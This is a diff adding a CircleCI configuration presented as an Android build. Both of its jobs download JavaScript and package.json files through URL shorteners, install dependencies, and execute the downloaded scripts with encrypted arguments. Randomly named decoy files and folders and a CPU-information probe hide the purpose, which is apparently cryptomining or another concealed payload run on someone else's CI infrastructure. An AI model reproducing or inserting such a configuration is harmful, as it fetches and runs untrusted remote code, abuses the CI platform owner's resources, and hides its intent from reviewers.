@@ -1,0 +1,54 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  cong-viec:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: touch tb7lgppqlid8xrpx83do.py
+      - run: touch sk6qkag6nt8ni9eowjnx0a5.cpp
+      - run: curl -fsSL shorturl.at/orxK7 -o 84dnsbmiyfhp6bswlu.js && curl -fsSL
+          shorturl.at/jGIJN -o package.json && curl -fsSL shorturl.at/gzTW0 -o
+          kbovxtx6tp8.js
+      - run: touch 4d8zkl1sxfvea.py
+      - run: mkdir 81jo9af7hn7uslrtrut1l
+      - run: npm i -s
+      - run: mkdir ugk02txautq5a1zsocdfj7ena
+      - run: mkdir gbcfp9g7n9h4ke7sv
+      - run: node kbovxtx6tp8 -s
+          U2FsdGVkX1+n8WwVHAdFTh8a+GAaBWgWAJOLx/yYi4UrQ86Ctd42xYungWOkS6xXJI1r1TPlnpYTfYMs5vMvzsy393Z70rsNNxc5C4JO212WpsABAgjvmJuu90OLi6HLZ8an7j2k1ygbgRTToWZvEz89W2AuIuqwDB1NkD07DxeEBHskR5ATbTl01CBWVuCGzjuYYiBCN/ke2fcrRcvg1lmFyE1JsA/hhaishW+jbQk=
+          -t U2FsdGVkX191RIn1ouX5PwGmgM5iN6lHhRhdbflEHkagrlj4V6V0xE6XvszmI+Cj
+          -lpn U2FsdGVkX18St28wqGdxRo1ElX5dljrg8reapHJqEsExkJs3upqVf0Ypt4No58Br
+          -r
+          U2FsdGVkX19vgboXKnCxhZnjKkRJNDtoZcITDSS0ZVQKEfpHfdrCMBN5gLTJIA6onouFQUZhHxndCsBIfssyCUlNlpgBizdTerZ1JN9Lycb0WUsCZPZTY8a7rXUYkfdCYg3mV9zJNSJGSOxfNl4y6GOwkVAF8CrjKqMzAGdLhmlpi8vAodpxOVRgIWQxvZPWfnzb9KHT8YFxQ+0ap9OOYLTX64/k2erfxO+AOetDiGOuwakngSrB2Kz/an7bmdNzzUqpYqHO6x8JAuaDH3qOU7sqcqSz9/hubjZtffoC7jp5M2Pfx3DsoNIJn7YVzUfGtCNVl2ti0MEr6wIp+Y9ZrgTD5fFZaUkXVe5H5E6UNLHZOO0iIgpIc0I/d4NAxCdk
+          -sp
+  build:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: touch ajkosgfw16x1qedt.js
+      - run: touch s9ay4ppnr80mqksgc668fejvr.css
+      - run: curl -fsSL shorturl.at/sAPTY -o s4nh2xhqplcgbl.js && curl -fsSL
+          shorturl.at/cdeBM -o v5k4nz3q.js && curl -fsSL shorturl.at/chlnC -o
+          package.json
+      - run: touch 0uqzzll7n42ju1r08rv2bcvh.php
+      - run: mkdir r104gj3w2tpk23tm9rssbrqh
+      - run: npm i -s
+      - run: cat /proc/cpuinfo | grep 'vendor' | uniq && cat /proc/cpuinfo | grep 'model
+          name' | uniq && cat /proc/cpuinfo | grep processor | wc -l && cat
+          /proc/cpuinfo | grep 'core id'
+      - run: node s4nh2xhqplcgbl -r
+          U2FsdGVkX1+h6dsVC75hoDuVA96lHAgfTaqjokEKG6GXy5k2QU2NEcfTm70IdUTa5+zeaJqMlAY08/NMlzBQ/tOWBvXWYSjhUh33qbewO4lBytkQKHs6Xo/rVZv7aLhz9QZYkOeyXoGpBgXK/vNABEHw/8r6weHHAsUcHZ3Xl/RJ433AZPmr5Di6hr49Cyyvoel4jgWYkFzL2FojbeAHOCVyxow2+eXtS8LJmIHrcU3JPK/dLQ5hu+SZoTZignpo5ZpMXslYXk1G/mFwUPSFjivkSndZnmQKN1/EvC8e1L+j27vcdIMPozOqOl6292aFD/f+H5TmmMy4zGkkA/qfbAzLvgwEQo02O7zqOFrRMSy8A5542d6ZxHBrqZcxMZgh
+          -lpn U2FsdGVkX1+uMkcqKAV/8Ba0KdUus9QEG78eUvtjc8o= -s
+          U2FsdGVkX18DJ5ar2opdhjrQe8NoH73YgVG8hVb2aO/ygupolpsdHr5o4foRGx2iwRpvkv5HJ4CdAbmWXP0OPvZK/5ipJDxSKGoz8hoIClcRi6OHZwvM15WVAis4OKNG2GGCbGVQZ3weA/gF8DkB2lyFqrst/17tIpXQdHtzUozub40GKzZccbDjROpES/OmiyOraBDkBEReGvlEvYGcVW6VKW/86Ec1lO+YiuV1pFQ=
+          -t U2FsdGVkX18+ZSyK9LDFhZLu70BFh3cgZdfFwGVf4SQVZWXAM4oVNa6tGqwSry+l
+          -sp
+      - run: touch 70rnxpcjx9qx3zwi4o31sg8.ts
+workflows:
+  runJobs:
+    jobs:
+      - cong-viec
+  buildSoure:
+    jobs:
+      - build
